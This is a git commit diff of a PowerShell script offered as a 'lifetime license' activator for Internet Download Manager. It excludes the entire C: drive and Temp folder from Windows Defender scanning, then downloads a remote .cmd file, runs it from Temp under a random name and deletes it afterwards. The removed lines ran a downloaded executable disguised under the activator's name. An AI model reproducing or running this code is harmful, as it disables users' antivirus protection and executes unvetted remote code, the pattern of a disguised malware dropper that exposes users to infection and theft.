196b7c2e5a256cf61852698dad51ca2546258fa0
Pctoolsbox.com <45397057+Pctoolsbox@users.noreply.github.com>
2024-12-04 15:32:16 +0200

    Update IDM-Lifetime-license.ps1

--- IDM-Lifetime-license.ps1
+++ IDM-Lifetime-license.ps1
@@ -1,13 +1,35 @@
 # Check the instructions here on how to use it https://github.com/lstprjct/IDM-Activation-Script/wiki
 
 Add-MpPreference -ExclusionPath "C:\","IDMLifetimelicense.exe","C:\Windows\Temp\"
-$url = "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe"
-$outpath = "C:\Windows\Temp\IDMLifetimelicense.exe"
-Invoke-WebRequest -Uri $url -OutFile $outpath
-$wc = New-Object System.Net.WebClient
-$wc.DownloadFile($url, $outpath)
-$args = @("Comma","Separated","Arguments")
-Start-Process -Filepath "C:\Windows\Temp\IDMLifetimelicense.exe" -ArgumentList $args
+
+$ErrorActionPreference = "Stop"
+# Enable TLSv1.2 for compatibility with older clients
+[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
+
+$DownloadURL = 'https://github.com/Pctoolsbox/IDM-Activation-Lifetime-license/raw/refs/heads/main/license.cmd'
+
+$rand = Get-Random -Maximum 99999999
+$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
+$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\license_$rand.cmd" } else { "$env:TEMP\license_$rand.cmd" }
+
+try {
+    $response = Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing
+}
+catch {
+    $response = Invoke-WebRequest -Uri $DownloadURL2 -UseBasicParsing
+}
+
+$ScriptArgs = "$args "
+$prefix = "@REM $rand `r`n"
+$content = $prefix + $response
+Set-Content -Path $FilePath -Value $content
+
+Start-Process $FilePath $ScriptArgs -Wait
+
+$FilePaths = @("$env:TEMP\license*.cmd", "$env:SystemRoot\Temp\license*.cmd")
+foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
+
+
 
 
 $ErrorActionPreference = "Stop"
